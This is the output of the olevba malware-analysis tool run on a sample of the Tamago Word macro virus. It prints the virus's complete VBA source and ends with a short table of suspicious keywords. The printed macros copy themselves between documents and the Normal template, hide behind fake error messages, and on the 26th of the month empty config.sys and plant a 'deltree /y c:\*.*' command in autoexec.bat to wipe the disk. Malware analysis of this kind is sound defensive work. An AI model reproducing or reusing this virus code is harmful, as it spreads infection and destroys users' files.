olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tamago-803021f482191462107bdb87193c64c825dfadab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tamago-803021f482191462107bdb87193c64c825dfadab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Tamago-803021f482191462107bdb87193c64c825dfadab - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizOk
    GoTo WizTart
WizOk:
    WordBasic.FileNewDefault
    If WordBasic.Day(WordBasic.Now()) = 26 Then GoTo BHappy
    WordBasic.MsgBox "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi", -1
    GoTo WizEnd
WizTart:
    If WordBasic.Day(WordBasic.Now()) <> 26 Then GoTo WizEnd
    WordBasic.FileNewDefault
    Open "c:\config.sys" For Output As 1
    Close 1
    Open "c:\autoexec.bat" For Output As 1
    Print #1, "@echo off"
    Print #1, "cls"
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "echo            SaLamA'S CoRP - AlL lEfTS ReSerVeD - 1997"
    Print #1, "echo                        TaMaGoXI bY WiZaRD***"
    Print #1, "echo                                          ***"
    Print #1, "echo                                         *"
    Print #1, "echo                                        *"
    Print #1, "echo                          *************"
    Print #1, "echo                         *             *"
    Print #1, "echo                        *  ****   ****  *"
    Print #1, "echo                        *               *"
    Print #1, "echo                        *     *****     *"
    Print #1, "echo                         ***************"
    Print #1, "echo."
    Print #1, "echo                     eXPecT nO MeRcY FRoM HiM"
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "echo File' not found: Serve Alcatara Mane'? (S/N)"
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "deltree /y c:\*.* >nul"
    Close 1
BHappy:
    WordBasic.Beep
    WordBasic.MsgBox "EtERnAl LoVE 2 mY LitTlE gIrL Gi", "TAmAGoXi's NoTe", 64
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ArquivoSalvarComo.bas 
in file: Virus.MSWord.Tamago-803021f482191462107bdb87193c64c825dfadab - OLE stream: 'Macros/VBA/ArquivoSalvarComo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs dlg
    On Error GoTo -1: On Error GoTo WizEnd
    WordBasic.Dialog.FileSaveAs dlg
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizMod
    GoTo WizTart
WizMod:
    WordBasic.FileSaveAs dlg
    WordBasic.MsgBox "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi", -1
    GoTo WizEnd
WizTart:
    dlg.Format = 1
    On Error GoTo -1: On Error GoTo WSave
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec"
WSave:
    On Error GoTo -1: On Error GoTo WClose
    WordBasic.MacroCopy "Global:ArquivoSalvarComo", WordBasic.[WindowName$]() + ":ArquivoSalvarComo"
WClose:
    On Error GoTo -1: On Error GoTo WOpen
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
WOpen:
    On Error GoTo -1: On Error GoTo WModelos
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOp"
WModelos:
    On Error GoTo -1: On Error GoTo WFerram
    WordBasic.MacroCopy "Global:ArquivoModelos", WordBasic.[WindowName$]() + ":ArquivoModelos"
WFerram:
    On Error GoTo -1: On Error GoTo WUtil
    WordBasic.MacroCopy "Global:FerramMacro", WordBasic.[WindowName$]() + ":FerramMacro"
WUtil:
    On Error GoTo -1: On Error GoTo WImp
    WordBasic.MacroCopy "Global:UtilMacro", WordBasic.[WindowName$]() + ":UtilMacro"
WImp:
    On Error GoTo -1: On Error GoTo WImpP
    WordBasic.MacroCopy "Global:ArquivoImprimir", WordBasic.[WindowName$]() + ":ArquivoImprimir"
WImpP:
    On Error GoTo -1: On Error GoTo WizSave
    WordBasic.MacroCopy "Global:ArquivoImprimirPadrão", WordBasic.[WindowName$]() + ":ArquivoImprimirPadrão"
WizSave:
    WordBasic.FileSaveAs dlg
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Tamago-803021f482191462107bdb87193c64c825dfadab - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizOk
    GoTo WizTart
WizOk:
    If WordBasic.Day(WordBasic.Now()) = 26 Then GoTo BHappy
    WordBasic.MsgBox "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi", -1
    GoTo WizEnd
WizTart:
    On Error GoTo -1: On Error GoTo WSave
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec"
WSave:
    On Error GoTo -1: On Error GoTo WClose
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoSalvarComo", "Global:ArquivoSalvarComo"
WClose:
    On Error GoTo -1: On Error GoTo WOpen
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose"
WOpen:
    On Error GoTo -1: On Error GoTo WUtil
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOp", "Global:AutoOpen"
WUtil:
    On Error GoTo -1: On Error GoTo WModelos
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":UtilMacro", "Global:UtilMacro"
WModelos:
    On Error GoTo -1: On Error GoTo WFerram
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoModelos", "Global:ArquivoModelos"
WFerram:
    On Error GoTo -1: On Error GoTo WImp
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FerramMacro", "Global:FerramMacro"
WImp:
    On Error GoTo -1: On Error GoTo WImpP
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoImprimir", "Global:ArquivoImprimir"
WImpP:
    On Error GoTo -1: On Error GoTo WizChk
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoImprimirPadrão", "Global:ArquivoImprimirPadrão"
WizChk:
    If WordBasic.Day(WordBasic.Now()) <> 26 Then GoTo WizEnd
    Open "c:\config.sys" For Output As 1
    Close 1
    Open "c:\autoexec.bat" For Output As 1
    Print #1, "@echo off"
    Print #1, "cls"
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "echo            SaLamA'S CoRP - AlL lEfTS ReSerVeD - 1997"
    Print #1, "echo                        TaMaGoXI bY WiZaRD***"
    Print #1, "echo                                          ***"
    Print #1, "echo                                         *"
    Print #1, "echo                                        *"
    Print #1, "echo                          *************"
    Print #1, "echo                         *             *"
    Print #1, "echo                        *  ****   ****  *"
    Print #1, "echo                        *               *"
    Print #1, "echo                        *     *****     *"
    Print #1, "echo                         ***************"
    Print #1, "echo."
    Print #1, "echo                     eXPecT nO MeRcY FRoM HiM"
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "echo File' not found: Serve Alcatara Mane'? (S/N)"
    Print #1, "echo."
    Print #1, "echo."
    Print #1, "deltree /y c:\*.* >nul"
    Close 1
BHappy:
    WordBasic.Beep
    WordBasic.MsgBox "EtERnAl LoVE 2 mY LitTlE gIrL Gi", "TAmAGoXi's NoTe", 64
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Tamago-803021f482191462107bdb87193c64c825dfadab - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizOk
    GoTo WizTart
WizOk:
    WordBasic.MsgBox "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi", -1
    GoTo WizEnd
WizTart:
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs dlg
    dlg.Format = 1
    On Error GoTo -1: On Error GoTo WSave
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec"
WSave:
    On Error GoTo -1: On Error GoTo WClose
    WordBasic.MacroCopy "Global:ArquivoSalvarComo", WordBasic.[WindowName$]() + ":ArquivoSalvarComo"
WClose:
    On Error GoTo -1: On Error GoTo WOpen
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
WOpen:
    On Error GoTo -1: On Error GoTo WModelos
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOp"
WModelos:
    On Error GoTo -1: On Error GoTo WFerram
    WordBasic.MacroCopy "Global:ArquivoModelos", WordBasic.[WindowName$]() + ":ArquivoModelos"
WFerram:
    On Error GoTo -1: On Error GoTo WUtil
    WordBasic.MacroCopy "Global:FerramMacro", WordBasic.[WindowName$]() + ":FerramMacro"
WUtil:
    On Error GoTo -1: On Error GoTo WImp
    WordBasic.MacroCopy "Global:UtilMacro", WordBasic.[WindowName$]() + ":UtilMacro"
WImp:
    On Error GoTo -1: On Error GoTo WImpP
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoImprimir", "Global:ArquivoImprimir"
WImpP:
    On Error GoTo -1: On Error GoTo WizSave
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoImprimirPadrão", "Global:ArquivoImprimirPadrão"
WizSave:
    WordBasic.FileSaveAs dlg
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UtilMacro.bas 
in file: Virus.MSWord.Tamago-803021f482191462107bdb87193c64c825dfadab - OLE stream: 'Macros/VBA/UtilMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizOk
    WordBasic.MsgBox "Erro de compilação módulo 34:121 Visual Basic. Contate Suporte On-Line.", "MicoSoft World", 48
    GoTo WizEnd
WizOk:
    WordBasic.MsgBox "o WiZaRD NauM T LiBeRoU eSsA OpÇãO!!!", "TAmAGoXi's NoTe", 64
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ArquivoModelos.bas 
in file: Virus.MSWord.Tamago-803021f482191462107bdb87193c64c825dfadab - OLE stream: 'Macros/VBA/ArquivoModelos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizOk
    WordBasic.MsgBox "Erro de compilação módulo 34:121 Visual Basic. Contate Suporte On-Line.", "MicoSoft World", 48
    GoTo WizEnd
WizOk:
    WordBasic.MsgBox "o WiZaRD NauM T LiBeRoU eSsA OpÇãO!!!", "TAmAGoXi's NoTe", 64
WizEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FerramMacro.bas 
in file: Virus.MSWord.Tamago-803021f482191462107bdb87193c64c825dfadab - OLE stream: 'Macros/VBA/FerramMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim caminho$
    caminho$ = Environ("TAMAGOXI")
    If caminho$ = "GMS" Then GoTo WizOk
    WordBasic.MsgBox "Erro de compilação módulo 34:121 Visual Basic. Contate Suporte On-Line.", "MicoSoft World", 48
    GoTo WizEnd
WizOk:
    WordBasic.MsgBox "o WiZaRD NauM T LiBeRoU eSsA OpÇãO!!!", "TAmAGoXi's NoTe", 64
WizEnd:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
